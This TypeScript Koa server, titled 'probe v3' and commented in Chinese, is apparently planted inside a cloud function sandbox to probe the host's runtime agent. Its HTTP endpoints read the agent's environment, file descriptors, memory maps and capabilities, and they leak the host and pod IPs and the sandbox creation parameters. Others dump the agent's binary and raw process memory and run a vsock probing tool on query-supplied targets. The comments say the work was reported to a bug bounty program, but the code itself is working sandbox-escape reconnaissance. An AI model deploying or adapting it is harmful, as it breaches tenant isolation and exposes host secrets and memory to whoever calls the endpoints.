import Koa from 'koa';
import bodyParser from 'koa-bodyparser';
import Router from '@koa/router'
import * as http from 'http';
import * as fs from 'fs';
import * as path from 'path';
import { execFile } from 'child_process';
import { promisify } from 'util';
const execFileP = promisify(execFile);
const app = new Koa();
const router = new Router();

router.get('/', ctx => { ctx.body = `probe v3`; })

// ===== v3: runtime-agent 深挖（ByteSRC 报备完成；只读分析+通道存在性）=====

// A1: PID2 runtime-agent 全画像 + 宿主信息泄露值 + iomem
router.get('/api/probe/agent', async (ctx) => {
    const out: any = {};
    const rd = (p: string): string | null => { try { return fs.readFileSync(p, 'utf8'); } catch (e) { return null; } };
    const pid = '2';
    const base = `/proc/${pid}`;
    out.cmdline = rd(`${base}/cmdline`)?.replace(/\0/g, ' ').trim() || null;
    out.exe = (() => { try { return fs.readlinkSync(`${base}/exe`); } catch (e: any) { return 'ERR:' + String(e.code || e.message).slice(0, 40); } })();
    try { const st = fs.statSync(`/proc/${pid}/exe`); out.exeSize = st.size; } catch (e) {}
    out.statusKey = rd(`${base}/status`)?.split('\n').filter((l: string) => /^(Name|Pid|PPid|Cap|Seccomp|Threads)/.test(l)) || null;
    // maps（前 60 行）
    out.maps = rd(`${base}/maps`)?.split('\n').slice(0, 60) || null;
    // fd 符号链接表（agent 持有的 socket/管道）
    try {
        out.fds = fs.readdirSync(`${base}/fd`).map((fd: string) => {
            let target = '';
            try { target = fs.readlinkSync(`${base}/fd/${fd}`); } catch (e) { target = '?'; }
            return `${fd}->${target}`;
        });
    } catch (e: any) { out.fdsErr = String(e.message).slice(0, 60); }
    // agent environ（值脱敏保留 key=value 前 120 字符——含宿主 IP 等泄露点）
    const env = rd(`${base}/environ`);
    out.environ = env ? env.split('\0').map((x: string) => x.slice(0, 150)).slice(0, 50) : null;
    // iomem（MMIO 布局——virtio-mmio 区域）
    out.iomem = rd('/proc/iomem')?.split('\n').slice(0, 40) || null;
    // ioports
    out.ioports = rd('/proc/ioports')?.split('\n').slice(0, 30) || null;
    // 我们的敏感 env 值
    out.selfEnv = {
        CREATE_SANDBOX_PARAMS: (process.env._FAAS_CREATE_SANDBOX_PARAMS || '').slice(0, 500),
        BYTED_HOST_IP: process.env.BYTED_HOST_IP,
        MY_HOST_IP: process.env.MY_HOST_IP,
        ROUTE_IP: process.env.ROUTE_IP,
        MY_POD_IP: process.env.MY_POD_IP,
        MY_POD_NAME: process.env.MY_POD_NAME,
    };
    // /proc/2/mem 可读性（ptrace 能力判定，只 open 不读）
    try { const fd = fs.openSync(`${base}/mem`, 'r'); fs.closeSync(fd); out.memReadable = 'OPEN-OK'; } catch (e: any) { out.memReadable = 'FAIL:' + String(e.message).slice(0, 60); }
    ctx.body = out;
});

// A2: agent 二进制分块 dump（base64，默认头 64KB；用于离线协议分析）
router.get('/api/probe/agentbin', async (ctx) => {
    const off = Number(ctx.query.off || 0);
    const len = Math.min(Number(ctx.query.len || 65536), 262144);
    try {
        const fd = fs.openSync('/proc/2/exe', 'r');
        const buf = Buffer.alloc(len);
        const n = fs.readSync(fd, buf, 0, len, off);
        fs.closeSync(fd);
        ctx.type = 'text/plain';
        ctx.body = { off, n, b64: buf.slice(0, n).toString('base64') };
    } catch (e: any) {
        ctx.body = { err: String(e.message).slice(0, 80) };
    }
});

// A3: agent 内存段 dump（root+SYS_PTRACE；按 maps 偏移）
router.get('/api/probe/agentmem', async (ctx) => {
    const start = ctx.query.start ? parseInt(String(ctx.query.start), 16) : 0;
    const len = Math.min(Number(ctx.query.len || 4096), 65536);
    if (!start) { ctx.body = { err: 'need start(hex)' }; return; }
    try {
        const fd = fs.openSync('/proc/2/mem', 'r');
        const buf = Buffer.alloc(len);
        const n = fs.readSync(fd, buf, 0, len, start);
        fs.closeSync(fd);
        ctx.body = { start: start.toString(16), n, hexPreview: buf.slice(0, Math.min(n, 256)).toString('hex'), b64: buf.slice(0, n).toString('base64') };
    } catch (e: any) {
        ctx.body = { err: String(e.message).slice(0, 80) };
    }
});

// A4: vsock 探测（静态 musl 二进制；无参数=矩阵，?cid=&port= 定向）
router.get('/api/probe/vsock', async (ctx) => {
    const tool = path.join(process.cwd(), 'tools', 'vsockprobe');
    try {
        const args: string[] = [];
        if (ctx.query.cid && ctx.query.port) args.push(`${ctx.query.cid}:${ctx.query.port}`);
        const r = await execFileP(tool, args, { timeout: 20000 });
        let parsed: any = null;
        try { parsed = JSON.parse(r.stdout); } catch (e) { parsed = { raw: r.stdout.slice(0, 500) }; }
        ctx.body = parsed;
    } catch (e: any) {
        ctx.body = { err: String(e.message).slice(0, 120), stderr: String(e.stderr || '').slice(0, 200) };
    }
});

// A5: agent 二进制 strings 快筛（在容器内 grep 关键符号——vsock 端口/ttrpc/psm）
router.get('/api/probe/agentstrings', async (ctx) => {
    const kw = String(ctx.query.kw || 'vsock|ttrpc|port|psm|sandbox|cid');
    try {
        // 读前 8MB 找可打印串并过滤（纯 node 实现，避免依赖 strings 命令）
        const fd = fs.openSync('/proc/2/exe', 'r');
        const chunk = Buffer.alloc(8 * 1024 * 1024);
        const n = fs.readSync(fd, chunk, 0, chunk.length, 0);
        fs.closeSync(fd);
        const text = chunk.slice(0, n).toString('latin1');
        const strings = text.match(/[\x20-\x7e]{6,}/g) || [];
        const pats = kw.split('|').map(s => s.trim()).filter(Boolean);
        const hits: string[] = [];
        for (const s of strings) {
            if (pats.some(p => s.toLowerCase().includes(p.toLowerCase()))) {
                hits.push(s.slice(0, 150));
                if (hits.length >= 200) break;
            }
        }
        ctx.body = { total: n, hitsCount: hits.length, hits: hits.slice(0, 200) };
    } catch (e: any) {
        ctx.body = { err: String(e.message).slice(0, 80) };
    }
});

app.use(bodyParser());
app.use(router.routes());
const PORT = 8000;
app.listen(PORT, () => { console.log(`probe v3 on ${PORT}`); });
